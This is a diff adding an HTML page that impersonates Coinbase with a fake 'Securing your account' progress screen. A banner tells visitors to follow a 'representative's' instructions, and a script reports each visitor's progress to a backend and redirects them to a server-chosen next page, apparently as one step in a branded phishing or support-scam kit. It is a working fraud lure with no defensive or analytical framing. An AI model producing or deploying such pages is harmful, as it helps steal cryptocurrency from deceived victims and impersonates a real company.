@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="en" class="dark" style="color-scheme: dark;">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Coinbase — Securing account</title>
+<link rel="icon" href="https://coinbase.com/favicon.ico">
+<link rel="stylesheet" href="/_next/static/css/68165cb776a47886.css">
+<link rel="stylesheet" href="/_next/static/css/97cc91616cea400d.css">
+<style>
+.rv-banner{width:100%;background:rgba(0,40,120,.55);border-bottom:1px solid rgba(59,130,246,.25);padding:10px 16px;text-align:center;font-size:12px;line-height:1.45;color:#cbd5e1;box-sizing:border-box}
+.rv-banner a{color:#60a5fa;text-decoration:underline}
+.rv-main{min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:24px 16px 48px;background:rgb(10,11,13)}
+.rv-card{width:100%;max-width:440px;background:rgba(255,255,255,.02);border-radius:16px;box-shadow:0 0 0 1px rgba(138,145,158,.2) inset;padding:36px 28px;box-sizing:border-box;margin-top:8px;text-align:center}
+.rv-check{width:56px;height:56px;border-radius:50%;background:#22c55e;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
+.rv-title{color:#fff;font-size:22px;font-weight:600;margin:0}
+.rv-sub{color:#94a3b8;font-size:14px;margin:10px 0 24px;line-height:1.5}
+.rv-steps{text-align:left;border-top:1px solid rgba(138,145,158,.15)}
+.rv-step{display:flex;align-items:center;gap:12px;padding:14px 0;border-bottom:1px solid rgba(138,145,158,.12);color:#fff;font-size:14px}
+.rv-step:last-child{border-bottom:0}
+.rv-step-icon{width:22px;height:22px;flex-shrink:0;display:flex;align-items:center;justify-content:center}
+.rv-step.pending .rv-step-icon{color:#4b5563}
+.rv-step.active .rv-step-icon{color:#3b82f6}
+.rv-step.done .rv-step-icon{color:#22c55e}
+.rv-step.pending{color:#6b7280}
+.rv-spin{width:18px;height:18px;border:2px solid rgba(59,130,246,.3);border-top-color:#3b82f6;border-radius:50%;animation:rv-spin .8s linear infinite}
+@keyframes rv-spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body style="font-family:'CoinbaseSansFont',system-ui,sans-serif;margin:0">
+<div class="rv-banner">This is our official ticket-based support system. Remember to follow the instructions provided by our representative and your assets will be safe. <a href="#">Privacy Policy</a></div>
+<div class="rv-main">
+  <svg width="36" height="36" viewBox="0 0 48 48" aria-label="Coinbase" style="margin-bottom:20px"><path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#fff"/></svg>
+  <div class="rv-card">
+    <div class="rv-check"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round"><path d="M20 6L9 17l-5-5"/></svg></div>
+    <h1 class="rv-title">Securing your account</h1>
+    <p class="rv-sub">Please wait while we revoke all unauthorized sessions and devices.</p>
+    <div class="rv-steps">
+      <div class="rv-step done" id="rv-s1"><span class="rv-step-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg></span>Suspicious activity detected</div>
+      <div class="rv-step active" id="rv-s2"><span class="rv-step-icon"><span class="rv-spin"></span></span>Revoking unauthorized sessions</div>
+      <div class="rv-step pending" id="rv-s3"><span class="rv-step-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/></svg></span>Verifying account security</div>
+    </div>
+  </div>
+</div>
+<script>
+(function(){
+  var s2=document.getElementById('rv-s2'), s3=document.getElementById('rv-s3');
+  setTimeout(function(){
+    s2.className='rv-step done'; s2.querySelector('.rv-step-icon').innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg>';
+    s3.className='rv-step active'; s3.querySelector('.rv-step-icon').innerHTML='<span class="rv-spin"></span>';
+    setTimeout(function(){
+      s3.className='rv-step done'; s3.querySelector('.rv-step-icon').innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg>';
+      setTimeout(function(){
+        fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Securing Account',choice:'completed'})})
+          .then(function(r){return r.json()}).then(function(d){if(d&&d.nextUrl)location.href=d.nextUrl;});
+      }, 800);
+    }, 2200);
+  }, 2000);
+})();
+</script>
+</body>
+</html>
